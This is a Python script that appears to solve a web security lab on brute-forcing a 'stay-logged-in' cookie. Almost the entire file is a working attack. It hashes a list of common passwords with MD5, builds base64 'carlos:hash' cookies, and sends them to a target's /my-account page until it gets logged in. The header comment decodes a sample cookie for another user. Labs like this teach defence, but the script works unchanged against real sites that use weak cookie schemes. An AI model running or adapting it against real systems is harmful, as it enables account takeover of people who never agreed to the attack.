import sys
import requests
import urllib3
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#lab:Brute-forcing a stay-logged-in cookie
#stay log in cookie:d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
#decode :wiener:51dc30ddc473d43a6011e9ebba6ca770(md5)

password=['123456\n', 'password\n', '12345678\n', 'qwerty\n', '123456789\n', '12345\n', '1234\n', '111111\n',
'1234567\n', 'dragon\n', '123123\n', 'baseball\n', 'abc123\n', 'football\n', 'monkey\n', 'letmein\n', 
'shadow\n', 'master\n', '666666\n', 'qwertyuiop\n', '123321\n', 'mustang\n', '1234567890\n', 'michael\n', 
'654321\n', 'superman\n', '1qaz2wsx\n', '7777777\n', '121212\n', '000000\n', 'qazwsx\n', '123qwe\n', 
'killer\n', 'trustno1\n', 'jordan\n', 'jennifer\n', 'zxcvbnm\n', 'asdfgh\n', 'hunter\n', 'buster\n', 
'soccer\n', 'harley\n', 'batman\n', 'andrew\n', 'tigger\n', 'sunshine\n', 'iloveyou\n', '2000\n',
'charlie\n', 'robert\n', 'thomas\n', 'hockey\n', 'ranger\n', 'daniel\n', 'starwars\n', 'klaster\n', 
'112233\n', 'george\n', 'computer\n', 'michelle\n', 'jessica\n', 'pepper\n', '1111\n', 'zxcvbn\n',
'555555\n', '11111111\n', '131313\n', 'freedom\n', '777777\n', 'pass\n', 'maggie\n', '159753\n', 
'aaaaaa\n', 'ginger\n', 'princess\n', 'joshua\n', 'cheese\n', 'amanda\n', 'summer\n', 'love\n', 
'ashley\n', 'nicole\n', 'chelsea\n', 'biteme\n', 'matthew\n', 'access\n', 'yankees\n', '987654321\n', 'dallas\n',
'austin\n', 'thunder\n', 'taylor\n', 'matrix\n', 'mobilemail\n', 'mom\n', 'monitor\n', 'monitoring\n', 
'montana\n', 'moon\n', 'moscow']

proxie={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def stay_loged(session,url):
    print('(+) Finding stay-logged-in Cookie .......')
    for i in password:
        cookie="carlos:"+hashlib.md5(i.strip().encode('utf-8')).hexdigest()
        cookie=base64.b64encode(bytes(cookie,"utf-8"))
        cookie=cookie.decode("utf-8")
        url_log=url+"/my-account"
        cookie_loged={"stay-logged-in":cookie}
        response=session.get(url_log,verify=False,cookies=cookie_loged,proxies=proxie)
        if "Log out" in response.text:
            print("(+) stay-logged-in Cookie : %s"%cookie)
            print("(+) Password : %s"%i.strip())
            print('(+) Log in successfully')
            sys.exit()


def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s www.site.com'%sys.argv[0])
        sys.exit(-1)
    
    session=requests.session()
    url=sys.argv[1]
    stay_loged(session,url)

if __name__=="__main__":
    main()